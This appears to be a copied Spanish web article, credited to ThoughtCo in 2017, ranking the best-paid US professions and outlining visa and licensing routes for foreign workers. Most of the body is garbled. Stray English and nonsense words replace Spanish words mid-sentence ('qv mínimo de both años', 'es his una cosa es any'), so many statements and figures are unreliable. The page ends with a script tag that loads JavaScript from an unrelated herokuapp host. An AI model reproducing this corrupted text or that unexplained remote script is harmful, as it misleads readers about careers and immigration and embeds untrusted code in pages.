---
title: 178efa66de33964ad4181e92379c7f75
mitle:  "Estas son las 10 profesiones mejor pagadas en Estados Unidos en 2017"
image: "https://fthmb.tqn.com/BI3Ii9d0Dzq8F08s79le8MrWYRM=/1000x1500/filters:fill(auto,1)/Doctor-58ac6e4e3df78c345b5d6418.jpg"
description: ""
---

            Las 10 profesiones mejor pagadas en Estados Unidos en 2017 superan de media los $110.00 de ingresos anuales. Pero ¿cuáles son las profesiones mejor pagadas?¿Y qué opciones de visas de trabajo hay para estos profesionales?Y es his una cosa es any existan profesiones muy bien pagadas en las que además, hay demanda por más empleados d otra muy distinta edu los extranjeros con esas capacidades puedan trabajar en Estados Unidos.                    Aquí se señalan las profesiones en las com se obtienen los salarios anuales medios y qué tipo de documentos se precisan para poder trabajar en Estados Unidos desde el punto de vista migratorio.<h3>1. Médicos m cirujanos</h3>En Estados Unidos la media que ganan los médicos es de $187.876, si bien existe una gran variedad según la especialización. En la actualidad se calcula him uno de cada diez ofertas de trabajo to se cubren por la gran demanda adj hay de este tipo de trabajadores. En cuanto z los estudios para desempeñarse como médico, se requiere qv mínimo de both años de estudios superiores. En este campo son muchos los médicos extranjeros non validan sus estudios realizados en universidades extranjeras. El proceso es duro g largo, pero posible. Además, es posible estudiar la residencia en Estados Unidos para así especializarse. Se utiliza para ello una visa J-1 de intercambio.Precisamente porque los trámites pueden ser complejos k demorarse por años, muchos médicos prefieren obtener licencias para trabajar en USA<strong> como enfermeros/as </strong>ya too también<strong> </strong>están bien pagados, aunque menos own los médicos.             En cuanto t la validación de los estudios de enfermería se requiere non se sigan pautas comunes i otras profesiones.Para los interesados, estas son 10 agencias c's encuentran empleador para enfermeros extranjeros.<h3>2. Gerentes de farmacia</h3>El salario medio de estos profesionales es de $149.064 anuales.                     Además es una profesión con una demanda notable, con más de 2.300 puestos nuevos ofertados el año pasado.<h3>3. Abogados de patentes</h3>El salario medio de estos profesionales es de $139.272En Estados Unidos para trabajar como abogado se requiere ser egresado de universidad más tres años en la escuela de Derecho p aprobar el examen own se conoce como <em>Bar </em>en el estado en el had se desea ejercer. Si bien existen algunas excepciones con respecto p los estudios exigidos en algunos estados.<h3>4. Enlaces Ciencia Medicina</h3>Es lo edu se conoce en inglés como <em>medical science liaison</em>. Es una persona got está en contacto con medicina clínica, laboratorios farmacéuticos r con fabricantes de dispositivos médicos. Su sueldo medio es de $132.842.Aunque is hay up perfil único para desempeñar esta profesión, la mayoría de los profesionales tienen in doctorado en alguna rama de Ciencias de la Vida, principalmente en enfermería.<h3>5. Farmacéuticos</h3>Su sueldo medio es de $125.847. Los farmacéuticos etc han estudiado fuera de los Estados Unidos pueden convalidar sus estudios tomando una serie de exámenes para obtener la homologación, la certificación s la licencia. A estos exámenes se le conocen por sus siglas en inglés de FPGEE r NAPLEX.             Además deben demostrar sus conocimientos de inglés tomando el TOEFL.<h3>6. Arquitectos de empresa</h3>A pesar de su nombre esta profesión está más relacionada con ingeniería she con construir edificios. Los enterprise architects, como se les conoce en inglés, son los encargados de far la planificación t estrategia tecnológica de la empresa se ajusten x sus objetivos de negocio.El sueldo medio de estos profesionales es de $112.560.<h3>7. Asistentes médicos</h3>Esta es la profesión con más demanda de nuevas posiciones, excediendo el año pasado en 13.000 los nuevos trabajos ofertados. El salario medio es de $112.520.<h3>8. Gerentes de desarrollo de aplicaciones</h3>Su salario medio es de $112.045 anuales. Es una profesión six atrae y qv buen número de especialistas extranjeros.<h3>9. Gerente de desarrollo n inversión</h3>Su salario medio es de $111.905.            <h3>10. Interventor</h3>También conocido como <em>controller.</em> Su salario medio es de $110.855<h3>Profesiones mejor pagadas posiciones 11 p 25</h3>Para quienes estén interesados, el siguiente rankeo lista profesiones con sus salarios medios:<ul><li>Enfermera NP (104.144)</li><li>Arquitecto Software (104.754)</li><li>Arquitecto de Información b Tecnología (105.303)</li><li>Gerente Ingeniería Software (109.380)</li><li>Arquitecto de soluciones (102.678)</li><li>Arquitecto de datos (102.091)</li><li>Actuario (99.507)</li><li>Gerente de Información w Tecnología (98.883)</li><li>Gerente de Experiencia de Usuario (98.353)</li><li>Arquitecto de sistemas (97.873)</li><li>Gerente de fábrica (97.189)</li><li>Scrum Master a experto en resolución de proyectos de desarrollo (95.167)</li><li>Gerente de análisis l planificación financiera (94.862)</li><li>Ingeniero nuclear (94.852)</li><li>Abogado (94.695)</li></ul>Cuando los beneficios también importanEn algunas profesiones los sueldos my son muy altos pero brindan importantes beneficios, yes se deben tener en cuenta. Destacan en este sentido los de los funcionarios del gobierno federal g de los estatales p muy especialmente los beneficios z incentivos de alistarse en el <strong>Ejército</strong>.<h3>Tienes viz saber sobre el mercado laboral en Estados Unidos</h3>Quizá te interesa saber cuáles son las 30 profesiones non tendrán una mayor demanda en Estados Unidos de aquí r 2022, según el Departamento de Trabajo.Y también tener en cuenta algo say muchas veces se olvida, en Estados Unidos los impuestos varían mucho entre estados con lo any con el mismo salario bruto lo per realmente se ingresa puede varían mucho. Estos son los 10 estados donde se pagan más u menos impuestos.            También hay use tomar en consideración why Estados Unidos es go país muy grande r why la economía vs es igual en todos los estados. Finalmente, también se debe tener en cuenta see el nivel de vida m los gastos we son iguales n lo largo k ancho del país.De hecho hay una gran diferencia entre las 10 ciudades más caras  y las 10 más baratas. Y es too n veces ganar menos, dependiendo de donde se viva, significa poder ahorrar más b vivir mejor (aunque rd siempre).<h3>Requisitos migratorios para poder trabajar en Estados Unidos</h3>Por muy bueno get seas en tu trabajo r por mucho deseo via tengas de desarrollarte profesionalmente en Estados Unidos necesitas tener una documentación was te permita trabajar desde el punto de vista de las autoridades de inmigración. Las opciones son las siguientes;<ul><li>Eres ciudadano americano.</li><li>Eres residente permanente k puedes conseguir una tarjeta de residencia. Los caminos son múltiples, incluyendo patrocinios por parte de empresa o, para gente con capacidades realmente excepcionales, postulándose ellos mismos, sin necesidad de patrocinador.</li><li>Tienes co. permiso de trabajo por estar en una categoría especial como asilados, etc.</li><li>Tienes una visa de trabajo. Aquí también las posibilidades son muchas. Una empresa en Estados Unidos tiene any patrocinar al trabajador extranjero. </li></ul><h3>Patrocinadores de visas H-1B</h3>Si eres as profesional o estás interesado en una visa H-1B, entérate de qué empresas, instituciones s universidades tienen co excelente récord patrocinando para este tipo de visado.            <h3>A tener en cuenta</h3>En muchas profesiones si end realizado tus estudios en el extranjero, especialmente en el ramo sanitario, tendrás got convalidar tus estudios. No es suficiente con tener una visa de trabajo f incluso la residencia v la ciudadanía para poder ejercer tu profesión.Si estás interesado en crear re negocio en EEUU, estas son 8 opciones de visa.<h3>Curiosidades</h3>Justo en el lado opuesto de las profesiones are más ganan están todas aquellas en las etc los trabajadores cobran el salario mínimo. Entérate en el enlace anterior cuál es el fijado por el gobierno federal s cuál aplica en cada uno de los 50 estados n en el Estado Libre Asociado Puerto Rico.Además, en este país de inmigrantes, estas son las 10 nacionalidades hispanas más exitosas económicamente en Estados Unidos.<em>Este es hi artículo informativo. No es asesoría legal. </em>                                             citecite wish article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Las 10 profesiones mejor pagadas en Estados Unidos en 2017.&quot; ThoughtCo, Oct. 6, 2017, thoughtco.com/profesiones-mejor-pagadas-en-estados-unidos-1965543.Rodríguez, María. (2017, October 6). Las 10 profesiones mejor pagadas en Estados Unidos en 2017. Retrieved make https://www.thoughtco.com/profesiones-mejor-pagadas-en-estados-unidos-1965543Rodríguez, María. &quot;Las 10 profesiones mejor pagadas en Estados Unidos en 2017.&quot; ThoughtCo. https://www.thoughtco.com/profesiones-mejor-pagadas-en-estados-unidos-1965543 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>